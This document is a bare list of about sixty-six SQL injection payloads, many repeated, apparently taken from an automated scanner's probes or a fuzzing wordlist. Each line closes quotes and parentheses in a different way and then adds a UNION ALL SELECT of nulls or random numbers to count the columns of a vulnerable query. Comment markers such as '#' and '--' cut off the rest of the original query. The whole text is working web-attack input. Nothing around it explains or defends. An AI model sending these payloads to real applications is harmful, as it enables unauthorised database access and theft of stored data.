+1'   )    )    union all select null,null,null,null,null,null#
+-6580'  )   union all select 9950,9950,9950,9950,9950,9950--
+-3781%'  )   union all select 7497,7497,7497,7497,7497--
+-2316%' union all select 8636,8636,8636,8636,8636,8636,8636--
+1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#
+1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#
+-5317'   )    )    union all select 7673,7673,7673,7673,7673,7673#
+-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#
+-2316%' union all select 8636,8636,8636,8636,8636,8636,8636--
+-8215%"  )   union all select 3877,3877,3877,3877,3877,3877--
+-7565'   )    )    union all select 7745,7745,7745,7745,7745,7745#
+1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#
+1'  )   where 8211  =  8211 union all select null,null,null,null,null#
+1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#
+-5317'   )    )    union all select 7673,7673,7673,7673,7673,7673#
+-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#
+1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#
+1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#
+1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#
+1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#
+1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#
+-2287'   )    )    union all select 1200,1200,1200,1200,1200#
+1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#
+1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#
+-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#
+1'   )    )    as bwjl where 8538  =  8538 union all select null,null,null,null,null,null,null#
+-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#
+-4825%'  )   union all select 6804,6804,6804,6804,6804,6804,6804--
+1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#
+1'   )    )    as bwjl where 8538  =  8538 union all select null,null,null,null,null,null,null#
+1%'   )    )    union all select null,null,null,null,null--
+1'   )    )    as bwjl where 8538  =  8538 union all select null,null,null,null,null,null,null#
+-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#
+-7858'  )   union all select 1541,1541,1541,1541,1541,1541#
+-8215%"  )   union all select 3877,3877,3877,3877,3877,3877--
+1'   )    )    as bwjl where 8538  =  8538 union all select null,null,null,null,null,null,null#
+-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#
+-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#
+1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--
+-3781%'  )   union all select 7497,7497,7497,7497,7497--
+-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#
+1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#
+1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#
+-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#
+1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#
+1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#
+-5317'   )    )    union all select 7673,7673,7673,7673,7673,7673#
+1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#
+-3378%"   )    )    union all select 9357,9357,9357,9357,9357--
+1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#
+-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#
+-3781%'  )   union all select 7497,7497,7497,7497,7497--
+-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#
+-2287'   )    )    union all select 1200,1200,1200,1200,1200#
+1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#
+1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#
+-4825%'  )   union all select 6804,6804,6804,6804,6804,6804,6804--
+1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#
+1'+  (  select cjcp where 2590  =  2590 union all select null,null,null,null,null,null,null#
+-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#
+1'   )    )    as bwjl where 8538  =  8538 union all select null,null,null,null,null,null,null#
+-8215%"  )   union all select 3877,3877,3877,3877,3877,3877--
+-1106'   )    )    union all select 2855,2855,2855,2855,2855,2855,2855#
+-6580'  )   union all select 9950,9950,9950,9950,9950,9950--
+-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#
+1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#
